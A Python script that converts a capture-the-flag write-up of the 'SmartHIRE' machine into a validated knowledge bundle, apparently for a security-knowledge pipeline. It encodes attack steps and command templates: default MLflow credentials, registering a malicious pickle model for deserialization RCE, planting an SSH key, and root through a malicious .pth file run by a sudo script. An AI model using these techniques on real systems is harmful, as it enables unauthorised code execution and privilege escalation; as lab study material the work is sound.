"""Build and validate the completed SmartHIRE SemanticDraftBundle."""
import sys, pathlib
sys.path.insert(0, '/home/titagram/sedna/src')
sys.path.insert(0, '/home/titagram/sedna/tests/knowledge')
from test_semantic_llm import _prepared_from_markdown
from sedna.knowledge.semantic.drafts import SemanticDraftBundle
from sedna.knowledge.semantic.materialize import validate_segment_accounting

md=open('/home/titagram/htb-writeups/write-ups/machines/SmartHIRE/SmartHIRE.md').read()
prepared=_prepared_from_markdown(md,title='Machine: SmartHIRE')
print('segments:',len(prepared.segments))

def step(local_id, ordinal, access_before, access_after, environment, privileges_before,
         privileges_after, observations, hypothesis, action, evidence, citation):
    return {
      'artifact_type':'case_step','local_id':local_id,'ordinal':ordinal,
      'state_before':{'access':access_before,'environment':environment,'privileges':privileges_before},
      'observations':observations,
      'hypotheses':[{'statement':hypothesis,'origin':'explicit'}],
      'selected_action':{'intent':action},
      'evidence':[{'summary':evidence,'origin':'explicit','category':'exploitation'}],
      'state_after':{'access':access_after,'environment':environment,'privileges':privileges_after},
      'origin':'explicit','citations':[{'segment_indexes':[citation]}]
    }

steps=[
 step('step-1',1,'unauthenticated network access','MLflow registry admin access',['Linux','nginx','smarthire.htb','models.smarthire.htb'],[],[],
      ['22/tcp SSH and 80/tcp nginx redirect to smarthire.htb','vhost enumeration finds models.smarthire.htb = MLflow server behind Basic Auth','admin:password grants full MLflow REST API access'],
      'a hidden MLflow subdomain exposes the model registry where the app reads models from',
      'enumerate virtual hosts and authenticate to the MLflow registry','MLflow registry API accessible with admin:password',1),
 step('step-2',2,'MLflow registry admin access','unauthenticated RCE as svcweb',['/predict','mlflow.pyfunc.load_model','pickle deserialization'],[],['svcweb'],
      ['/predict loads models:/{company}-{user_id}-model with load_model','a model is deserialized from the registry','a malicious __reduce__ pickle runs on unpickle'],
      'loading a malicious registered model version yields deserialization RCE',
      'plant a malicious model version and trigger /predict',
      'reverse shell or planted SSH key as svcweb obtained',3),
 step('step-3',3,'unauthenticated RCE as svcweb','stable SSH shell + user flag',['SSH','authorized_keys'],[],['svcweb'],
      ['plant attacker SSH key then SSH in','groups svcweb, mlflowweb, devs','/home/svcweb/user.txt readable'],
      'an SSH key gives a stable shell and the user flag',
      'plant ssh key and read user.txt','user flag obtained as svcweb',4),
 step('step-4',4,'stable SSH shell as svcweb','root file read',['sudo','mlflowctl.py','site.addsitedir','plugins/dev','.pth'],[],['root'],
      ['sudo -l shows (root) NOPASSWD mlflowctl.py *','mlflowctl.py calls site.addsitedir on each plugins/ subdir','plugins/dev is writable by group devs','a .pth line starting with import executes as root'],
      'a root-run script that adds a group-writable plugins dir to sys.path can be abused with a .pth file',
      'plant a malicious .pth and run the sudo command to copy root.txt','root flag obtained',4),
]

bundle={
 'artifacts':[{
   'draft_type':'case','artifact_type':'case','knowledge_role':'case_study',
   'local_id':'case-smarthire','origin':'explicit','title':'SmartHIRE: MLflow pickle model RCE and .pth plugin sudo root',
   'starting_access':'unauthenticated HTTP access to a Flask app backed by MLflow',
   'source_quality':'complete','difficulty':'medium',
   'outcome':'user and root proofs obtained; proof values redacted',
   'transferable_properties':[
     'an app that deserializes a registered MLflow model can be taken over by planting a malicious model version',
     'use __reduce__ with only stdlib functions so the pickle stays cloudpickle-compatible across Python versions',
     'a root-run script calling site.addsitedir on a group-writable plugins dir is exploitable via a malicious .pth file',
     'vhost enumeration can reveal hidden backend services (MLflow) that hold the real attack surface'
   ],
   'non_transferable_properties':['registry credentials, model names, user IDs, and service ports are target-specific'],
   'steps':steps,'citations':[{'segment_indexes':[1,2,3,4,6]}]
 }],
 'execution_examples':[
   {
    'local_id':'ex-mlflow','parent_local_id':'step-2',
    'command_template':"curl -u {{reg_user}}:{{reg_pass}} -X POST http://{{target}}/api/2.0/mlflow/model-versions/create -H 'Host: {{registry_host}}' -H 'Content-Type: application/json' -d '{\"name\":\"{{model_name}}\",\"source\":\"mlflow-artifacts:/{{experiment_id}}/{{run_id}}/artifacts/model\",\"run_id\":\"{{run_id}}\"}'",
    'placeholders':[
      {'name':'reg_user','kind':'value','binding_policy':'host_supplied','role':'MLflow registry user'},
      {'name':'reg_pass','kind':'value','binding_policy':'host_supplied','role':'MLflow registry password'},
      {'name':'target','kind':'target','binding_policy':'authorized_scope','role':'authorized host'},
      {'name':'registry_host','kind':'target','binding_policy':'authorized_scope','role':'MLflow vhost'},
      {'name':'model_name','kind':'value','binding_policy':'host_supplied','role':'model the app loads'},
      {'name':'experiment_id','kind':'target','binding_policy':'authorized_scope','role':'MLflow experiment id'},
      {'name':'run_id','kind':'target','binding_policy':'authorized_scope','role':'malicious run id'}],
    'capability_hint':'register a malicious MLflow model version','purpose':'obtain deserialization RCE on the app that loads the model',
    'observed_role':'operator with MLflow registry admin credentials',
    'prerequisites':[{'statement':'the app deserializes the registered model and the registry is writable','citations':[{'segment_indexes':[3]}]}],
    'platform_constraints':[{'dimension':'execution_environment','relation':'required','value':'MLflow model registry','citations':[{'segment_indexes':[3]}]}],
    'citations':[{'segment_indexes':[3]}]
   },
   {
    'local_id':'ex-pth','parent_local_id':'step-4',
    'command_template':"echo 'import os; os.system(\"{{root_cmd}}\")' > {{plugins_dev}}/rce.pth; sudo python3.10 {{mlflowctl}} {{action}}",
    'placeholders':[
      {'name':'root_cmd','kind':'value','binding_policy':'host_supplied','role':'command to run as root'},
      {'name':'plugins_dev','kind':'value','binding_policy':'host_supplied','role':'group-writable plugin dir'},
      {'name':'mlflowctl','kind':'value','binding_policy':'host_supplied','role':'root-run python script'},
      {'name':'action','kind':'value','binding_policy':'host_supplied','role':'script action'}],
    'capability_hint':'execute code as root via .pth in a site.addsitedir plugin dir','purpose':'gain root from a NOPASSWD sudo python script',
    'observed_role':'unprivileged user in the group that owns the plugin dir',
    'prerequisites':[{'statement':'a root-run script adds the group-writable dir to sys.path and the user is in the owning group','citations':[{'segment_indexes':[4]}]}],
    'platform_constraints':[{'dimension':'os_family','relation':'required','value':'linux','citations':[{'segment_indexes':[4]}]}],
    'citations':[{'segment_indexes':[4]}]
   }
 ],
 'ignored_segment_indexes':[0,5]
}

b=SemanticDraftBundle.model_validate(bundle)
print('Pydantic OK. artifacts:',len(b.artifacts),'exec:',len(b.execution_examples))
validate_segment_accounting(prepared,b)
print('Segment accounting OK')
out=pathlib.Path('/tmp/bundles/SmartHIRE.json'); out.parent.mkdir(parents=True,exist_ok=True)
out.write_text(b.model_dump_json(indent=2)); print('wrote',out)
